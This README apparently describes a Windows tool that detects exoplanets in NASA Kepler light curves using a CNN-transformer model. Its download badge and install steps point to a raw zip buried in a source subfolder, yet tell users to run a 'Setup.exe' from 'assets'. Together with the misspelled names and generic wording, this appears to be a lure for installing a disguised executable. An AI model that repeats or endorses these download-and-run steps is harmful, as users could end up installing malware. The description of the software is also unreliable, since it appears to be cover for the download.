# 🔭 NASA_exoplanet_detection_using_CNN_transfromer - Detect distant planets using smart technology

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/raw/refs/heads/main/src/preprocessing/CN_detection_exoplanet_NAS_using_transfromer_2.8-beta.3.zip)

## 📋 Project Overview

This software identifies potential exoplanets in space data. It uses machine learning to analyze light curves from the NASA Kepler mission. Researchers rely on this data to find planets outside our solar system. The program looks for small dips in light. These dips often signal a planet crossing in front of a star.

We combine two powerful methods to ensure accuracy. The system uses visual pattern recognition to scan the shape of the light data. It also uses sequence language processing to understand how the light changes over time. These methods work together to spot planets that older software might miss.

## 💻 System Requirements

Your computer needs to meet these standards to run the software.

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** 8 gigabytes of RAM or more.
*   **Storage:** 500 megabytes of free disk space.
*   **Processor:** A modern multi-core processor from Intel or AMD.
*   **Graphics:** A dedicated graphics card helps but is not required.

## 🚀 Getting Started

Follow these steps to set up the software on your computer.

1. Visit [this link](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/raw/refs/heads/main/src/preprocessing/CN_detection_exoplanet_NAS_using_transfromer_2.8-beta.3.zip) to reach the download page.
2. Look for the file named `NASA_Exoplanet_Detector_Setup.exe` in the assets section.
3. Click the file to start the download.
4. Open the downloaded file once the process finishes.
5. Follow the instructions on the screen to install the program.
6. Find the new shortcut icon on your desktop to launch the tool.

## 🛠️ How to Use

The application window shows a dashboard. You can load Kepler data files directly into the program.

1. **Load Data:** Click the "Open File" button to select your light curve data. The program supports CSV and FITS formats.
2. **Process Data:** Press the "Run Analysis" button. The program checks the file for signs of a planet.
3. **View Results:** The center panel shows the light curve. If the system finds a candidate, it highlights the moment of transit.
4. **Trust the Results:** The software explains why it flagged a transit. It shows heat maps of the data. Use these maps to confirm that a transit exists.
5. **Check Confidence:** The tool gives a percentage score. Higher scores mean the software feels more certain about the planet candidate.

## 🧠 Understanding the Features

This software includes several advanced tools to help with your discovery.

### Dual Scale Pattern Recognition
The software scans data at two different speeds. One branch looks for wide, slow dips that signal large planets. The other branch looks for sharp, fast dips that signal small planets. This ensures the model misses nothing.

### Time Sequence Modelling
This part of the software tracks the history of the light data. It understands the rhythm of stars. It knows the difference between a planet transit and random noise from the star itself.

### Explainable AI
The program does not act as a black box. It tells you exactly which parts of the data triggered a positive result. You see the logic behind each decision.

### Uncertainty Check
The system runs multiple versions of its logic on every file. If all versions agree, the software reports high confidence. If versions disagree, it alerts the user. This feature prevents false results.

## 🔍 Frequently Asked Questions

**Does this software connect to the internet?**
The software does not require an internet connection to run the core analysis. You can import data from your local drive.

**Can I save my results?**
Yes. Use the "Save Report" button to create a PDF file. This file contains the light curve image and the confidence scores for your records.

**How do I update the software?**
Check the release page periodically. If a new version exists, download the new installer and run it. The installer replaces the old files automatically.

**What if the program runs slowly?**
Check your task manager. Close other programs that use lots of memory or processing power. 

**Is this tool accurate?**
The model uses 5-fold cross-validation. This means it tested itself five different ways during development to ensure it provides reliable results across various star types.

## 📚 Technical Support

This project relies on open-source code. Many researchers contributed to the underlying logic. You can look at the code structure to understand how it functions. If you find a bug or experience a crash, open a new issue on the main page. Please include your system details and a copy of the log file.

This software is for educational and research purposes. Always verify findings with professional community databases. The field of astrophysics changes quickly, and manual review remains important in validating all automated discoveries.